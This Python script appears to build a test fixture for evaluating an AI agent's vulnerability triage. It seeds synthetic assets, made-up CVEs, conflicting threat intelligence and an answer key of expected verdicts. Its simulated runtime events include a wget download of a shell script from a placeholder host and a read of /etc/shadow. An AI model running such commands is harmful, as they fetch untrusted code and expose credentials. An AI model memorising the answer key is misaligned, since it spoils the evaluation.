from __future__ import annotations

import argparse

import json

import os

import sys

import time

import traceback

from datetime import datetime, timedelta, timezone

from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parents[1]

def utc_iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")

def build_fixture(db, with_runtime: bool):
    """构建 5 条风险事件的受控环境。

    CVE 均为合成编号（CVE-2026-81xxx）：强制智能体只依据证据包推理，
    避免模型自身参数知识污染反事实对照。所有事实在 Fixture 真值表中定义。
    """
    from app import models
    from app.services.vulnerability_intelligence.service import upsert_source_record
    from app.services.security_evidence import persist_evidence

    now = datetime.now(timezone.utc)

    # ── 资产 ──
    edge01 = models.LinuxAsset(
        hostname="edge-01", ip_address="192.0.2.10", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="public",
        business_level="core", device_type="server", inventory_complete=True,
    )
    edge02 = models.LinuxAsset(
        hostname="edge-02", ip_address="192.0.2.11", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="internal",
        business_level="normal", device_type="server", inventory_complete=True,
    )
    edge03 = models.LinuxAsset(
        hostname="edge-03", ip_address="192.0.2.12", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="internal",
        business_level="normal", device_type="server", inventory_complete=True,
    )
    wrt = models.LinuxAsset(
        hostname="wrt-node", ip_address="192.0.2.13", distribution="openwrt",
        os_version="23.05.3", os_name="OpenWrt", exposure_level="dmz",
        business_level="important", device_type="gateway", device_model="generic-x86-64",
        inventory_complete=True,
    )
    db.add_all([edge01, edge02, edge03, wrt])
    db.flush()

    def packages(asset, rows):
        for name, version in rows:
            db.add(models.AssetPackage(asset_id=asset.id, package_name=name,
                                       package_version=version, package_manager="apt"))

    packages(edge01, [("nginx", "1.18.0-6ubuntu14.4"), ("curl", "7.81.0-1ubuntu1.10"),
                      ("zlib1g", "1:1.2.11.dfsg-2ubuntu9")])
    packages(edge02, [("openssl", "3.0.2-0ubuntu1.10"), ("openssh-server", "1:8.9p1-3ubuntu0.4")])
    packages(edge03, [("openssl", "3.0.2-0ubuntu1.10")])
    packages(wrt, [("dropbear", "2020.81-2"), ("uhttpd", "2022-08-28-1")])
    db.flush()

    def services(asset, rows):
        for name, port, listen, public, proc in rows:
            db.add(models.AssetService(
                asset_id=asset.id, service_name=name, port=port, protocol="tcp",
                listen_address=listen, is_public_exposed=public, process_name=proc,
            ))

    services(edge01, [("nginx", 443, "0.0.0.0", True, "nginx"),
                      ("ssh", 22, "0.0.0.0", True, "sshd")])
    services(edge02, [("ssh", 22, "192.0.2.11", False, "sshd")])
    services(edge03, [("ssh", 22, "192.0.2.12", False, "sshd")])
    services(wrt, [("dropbear", 22, "192.0.2.13", True, "dropbear"),
                   ("uhttpd", 80, "192.0.2.13", True, "uhttpd")])
    db.flush()

    # ── 漏洞与多源情报（源隔离记录，经真实 upsert 函数写入） ──
    def vuln(cve, title, package, fixed, cvss, severity, desc):
        db.add(models.VulnerabilityInfo(
            cve_id=cve, title=title, description=desc, cvss_score=cvss,
            cvss_severity=severity, affected_package=package, fixed_version=fixed,
            source="fixture", published_date="2026-09-01", last_modified_date="2026-10-01",
        ))
        db.flush()

    # E1：厂商确认受影响 + KEV + 高 EPSS + 公网核心资产 + 直接运行时证据
    vuln("CVE-2026-81001:jammy", "nginx HTTP/2 request smuggling (fixture)",
         "nginx", "1.18.0-6ubuntu14.6", 9.8, "Critical",
         "Fixture synthetic advisory: request smuggling in nginx HTTP/2 handling.")
    # E2：同资产、客户端包受影响，但无任何相关运行时证据
    vuln("CVE-2026-81002:jammy", "curl SOCKS5 heap overflow (fixture)",
         "curl", "7.81.0-1ubuntu1.16", 8.1, "High",
         "Fixture synthetic advisory: heap overflow in curl SOCKS5 proxy handshake.")
    # E3：NVD-only 候选——NVD 描述写明受影响分支为 3.1.x，3.0.x LTS 不受影响
    #（确定性版本规则仍判 potentially_affected：误匹配候选，考智能体能否识破）
    vuln("CVE-2026-81003:jammy", "openssl ASN.1 buffer overread (fixture)",
         "openssl", "3.0.2-0ubuntu1.15", 7.5, "High",
         "Fixture synthetic advisory. Affected branch: 3.1.0 before 3.1.7 only. "
         "The 3.0.x LTS branch (including 3.0.2-0ubuntu1.x) is NOT affected.")
    # E4：厂商 under_investigation vs NVD affected vs KEV 的矛盾情报
    vuln("CVE-2026-81004:jammy", "openssl DoS via crafted certificate (fixture)",
         "openssl", "3.0.2-0ubuntu1.15", 9.8, "Critical",
         "Fixture synthetic advisory: DoS via crafted X.509 certificate chain.")
    # E5：OpenWrt 设备 dropbear（厂商公告精确版本语义）
    db.add(models.VulnerabilityInfo(
        cve_id="CVE-2026-81005", title="dropbear pre-auth overflow (fixture)",
        description="Fixture synthetic advisory: pre-auth overflow in dropbear.",
        cvss_score=8.8, cvss_severity="High", affected_package="dropbear",
        fixed_version="2022.86-1", source="openwrt_operator_advisory",
        published_date="2026-09-10", last_modified_date="2026-10-01",
    ))
    db.flush()

    def intel(cve_base, kev, epss, pct):
        db.add(models.ThreatIntelSource(
            cve_id=cve_base + ":jammy" if cve_base != "CVE-2026-81005" else cve_base,
            is_kev=kev, epss_score=epss, epss_percentile=pct,
            exploit_status="known-exploited" if kev else "none",
        ))

    intel("CVE-2026-81001", True, 0.88, 0.97)
    intel("CVE-2026-81002", False, 0.05, 0.31)
    intel("CVE-2026-81003", False, 0.30, 0.72)
    intel("CVE-2026-81004", True, 0.75, 0.94)
    intel("CVE-2026-81005", False, 0.12, 0.44)
    db.flush()

    def sources(cve_base, canonical, nvd, kev, epss):
        if canonical is not None:
            upsert_source_record(db, cve_base, "canonical", {"records": [canonical]},
                                 source_updated_at="2026-10-01T00:00:00Z")
        upsert_source_record(db, cve_base, "nvd", nvd, source_updated_at="2026-10-01T00:00:00Z")
        if kev is not None:
            upsert_source_record(db, cve_base, "cisa_kev", kev, source_updated_at="2026-10-02T00:00:00Z")
        if epss is not None:
            upsert_source_record(db, cve_base, "epss", epss, source_updated_at="2026-10-02T00:00:00Z")

    sources("CVE-2026-81001",
            {"release": "jammy", "package": "nginx", "status": "affected",
             "fixed_version": "1.18.0-6ubuntu14.6", "priority": "high"},
            {"cvss": {"score": 9.8, "severity": "Critical", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "Request smuggling in nginx HTTP/2 handling (fixture).", "cwe": ["CWE-444"]},
            {"is_kev": True, "date_added": "2026-09-30", "due_date": "2026-10-21"},
            {"score": 0.88, "percentile": 0.97})
    sources("CVE-2026-81002",
            {"release": "jammy", "package": "curl", "status": "affected",
             "fixed_version": "7.81.0-1ubuntu1.16", "priority": "medium"},
            {"cvss": {"score": 8.1, "severity": "High", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "Heap overflow in curl SOCKS5 proxy handshake (fixture).", "cwe": ["CWE-787"]},
            None, {"score": 0.05, "percentile": 0.31})
    sources("CVE-2026-81003",
            None,
            {"cvss": {"score": 7.5, "severity": "High", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
             "description": "ASN.1 buffer overread (fixture). Affected branch: 3.1.0 before 3.1.7 only. "
                            "The 3.0.x LTS branch (including 3.0.2-0ubuntu1.x) is NOT affected.",
             "cwe": ["CWE-125"], "cpe_status": "affected"},
            None, {"score": 0.30, "percentile": 0.72})
    sources("CVE-2026-81004",
            {"release": "jammy", "package": "openssl", "status": "under_investigation",
             "fixed_version": "3.0.2-0ubuntu1.15", "priority": "unknown"},
            {"cvss": {"score": 9.8, "severity": "Critical", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "DoS via crafted X.509 certificate chain (fixture).", "cwe": ["CWE-400"],
             "cpe_status": "affected"},
            {"is_kev": True, "date_added": "2026-10-05", "due_date": "2026-10-26"},
            {"score": 0.75, "percentile": 0.94})
    db.flush()

    # OpenWrt 厂商公告（人工登记语义）
    db.add(models.OpenWrtAdvisory(
        cve_id="CVE-2026-81005", package_name="dropbear", release="23.05.3",
        source_url="https://fixtures.invalid/openwrt-advisory-81005",
        affected_versions_json=json.dumps(["2020.81-2"]),
        fixed_versions_json=json.dumps(["2022.86-1"]),
    ))
    db.flush()

    # ── 运行时证据（RuntimeEvent + SecurityEvidence 双表，经真实摄取语义） ──
    if with_runtime:
        recent = utc_iso(now - timedelta(minutes=40))
        stale_ts = utc_iso(now - timedelta(hours=72))

        def ev(host, asset, category, event_type, process, parent, cmdline, *, dest="", port=0,
               file_path="", sev="info", score=0, ts=None, pid=0, ppid=0, rule=""):
            return {
                "hostname": host, "asset_id": asset.id, "source": "falco", "event_type": event_type,
                "category": category, "severity": sev, "severity_score": score, "rule": rule,
                "process_name": process, "parent_process": parent, "commandline": cmdline,
                "file_path": file_path, "destination": dest, "port": port,
                "tactic": "", "technique": "", "risk_signal": rule,
                "timestamp": ts or recent, "occurred_at": ts or recent,
                "process_id": pid, "parent_process_id": ppid,
                "process_exec_id": f"exec-{host}-{pid}-{abs(hash(cmdline)) % 99999}",
                "parent_exec_id": f"exec-{host}-{ppid}" if ppid else "",
                "raw": {"fixture": True},
            }

        events = [
            # edge-01：nginx → sh → wget 可疑链 + 敏感文件读取（E1 相关）
            ev("edge-01", edge01, "process_execution", "execve", "nginx", "systemd",
               "nginx: worker process", pid=1200, ppid=1100),
            ev("edge-01", edge01, "process_execution", "execve", "sh", "nginx",
               "sh -c wget -qO /tmp/x http://198.51.100.23/x.sh", pid=1301, ppid=1200, sev="warning", score=62,
               rule="service_shell_spawn"),
            ev("edge-01", edge01, "process_execution", "execve", "wget", "sh",
               "wget -qO /tmp/x http://198.51.100.23/x.sh", pid=1302, ppid=1301, sev="warning", score=58,
               rule="downloader_execution"),
            ev("edge-01", edge01, "network_activity", "connect", "wget", "sh",
               "wget -qO /tmp/x http://198.51.100.23/x.sh", dest="198.51.100.23:4444", port=4444,
               pid=1302, ppid=1301, sev="warning", score=60),
            ev("edge-01", edge01, "sensitive_file_access", "openat", "sh", "nginx",
               "sh -c cat /etc/shadow", file_path="/etc/shadow", sev="critical", score=88,
               rule="read_sensitive_file", pid=1301, ppid=1200),
            ev("edge-01", edge01, "network_activity", "connect", "nginx", "systemd",
               "nginx: worker process", dest="192.0.2.50:443", port=443, pid=1200, ppid=1100),
        ]
        # edge-02：良性背景事件（E3/E4 无 openssl 直接证据）
        events += [
            ev("edge-02", edge02, "process_execution", "execve", "apt", "systemd",
               "apt update", pid=2100, ppid=2000),
            ev("edge-02", edge02, "network_activity", "connect", "apt", "systemd", "apt update",
               dest="198.51.100.30:80", port=80, pid=2100, ppid=2000),
            ev("edge-02", edge02, "process_execution", "execve", "sshd", "systemd",
               "sshd: session", pid=2200, ppid=2000),
            ev("edge-02", edge02, "sensitive_file_access", "openat", "sshd", "systemd",
               "sshd: session", file_path="/etc/passwd", sev="notice", score=36,
               rule="account_maintenance"),
        ]
        # wrt-node：72 小时前的过期证据（E5 数据质量反事实）
        events += [
            ev("wrt-node", wrt, "process_execution", "execve", "dropbear", "procd",
               "dropbear -p 22", pid=3100, ppid=3000, ts=stale_ts),
            ev("wrt-node", wrt, "network_activity", "connect", "dropbear", "procd",
               "dropbear -p 22", dest="192.0.2.60:52111", port=52111, pid=3100, ppid=3000, ts=stale_ts),
        ]
        for item in events:
            db.add(models.RuntimeEvent(
                asset_id=item["asset_id"], hostname=item["hostname"], source=item["source"],
                event_type=item["event_type"], category=item["category"], severity=item["severity"],
                severity_score=item["severity_score"], rule=item["rule"],
                process_name=item["process_name"], parent_process=item["parent_process"],
                commandline=item["commandline"], file_path=item["file_path"],
                destination=item["destination"], port=item["port"], risk_signal=item["risk_signal"],
                raw_json=json.dumps(item["raw"]), occurred_at=item["occurred_at"],
                process_id=item["process_id"], parent_process_id=item["parent_process_id"],
                process_exec_id=item["process_exec_id"], parent_exec_id=item["parent_exec_id"],
                sensor_id="sensor-" + item["hostname"], event_fingerprint=f"fp-{abs(hash(str(item)))%10**18}",
            ))
        db.flush()
        persist_evidence(db, events)

        # 采集器心跳：edge-01 正常；wrt-node 过期 + 丢失计数未上报（unavailable）
        db.add(models.RuntimeSensor(
            asset_id=edge01.id, sensor_id="sensor-edge-01", source="falco", status="running",
            last_heartbeat_at=now, dropped_events=0,
            capabilities_json=json.dumps({"metrics": "dropped_events"}), detail="fixture",
        ))
        db.add(models.RuntimeSensor(
            asset_id=wrt.id, sensor_id="sensor-wrt-node", source="logread", status="running",
            last_heartbeat_at=now - timedelta(hours=72), dropped_events=None,
            capabilities_json=json.dumps({"metrics": "unavailable"}), detail="fixture",
        ))
        db.flush()

    # ── 匹配与规则基线（消融组 A 的输出） ──
    from app.services.matching_engine import run_matching
    from app.services.risk_engine import calculate_risk

    run_matching(db)
    calculate_risk(db)
    db.commit()

TRUTH = {
    "CVE-2026-81001": {
        "label": "E1 公网核心资产·厂商确认受影响·KEV·直接运行时证据",
        "impact": "confirmed_affected",
        "directions": {"upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,            # High/Critical 或 immediate_fix → 审计策略必须转人工
        "runtime_expect": "verified",
    },
    "CVE-2026-81002": {
        "label": "E2 同资产客户端包受影响·无相关运行时证据",
        "impact": "confirmed_affected",
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor"},
        "needs_human": None,            # 自动确认或人工复核皆可接受（低紧迫度）
        "runtime_expect": "not_observed",
    },
    "CVE-2026-81003": {
        "label": "E3 NVD-only 误匹配候选·NVD 明示 3.1.x 才受影响而装机为 3.0.x",
        "impact": {"not_affected", "insufficient_evidence"},
        "directions": {"maintain", "downgrade_minor", "downgrade_major"},
        "actions": {"monitor", "defer", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
    },
    "CVE-2026-81004": {
        "label": "E4 厂商 under_investigation vs NVD affected vs KEV 矛盾情报",
        "impact": {"insufficient_evidence", "confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"monitor", "collect_more_evidence", "mitigate"},
        "needs_human": True,            # 冲突/证据不充分必须人工
        "runtime_expect": None,
    },
    "CVE-2026-81005": {
        "label": "E5 OpenWrt dropbear 受影响·采集过期+丢失未知",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": None,
        "runtime_expect": None,
    },
}

CASE_ORDER = ["CVE-2026-81001", "CVE-2026-81002", "CVE-2026-81003", "CVE-2026-81004", "CVE-2026-81005"]

def fresh_session_factory(tmp_root: Path):
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from app import models  # noqa: F401  先注册全部模型再建表
    from app.database import Base

    tmp_root.mkdir(parents=True, exist_ok=True)
    db_path = tmp_root / "linuxguard.db"
    engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    factory = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    return factory, engine
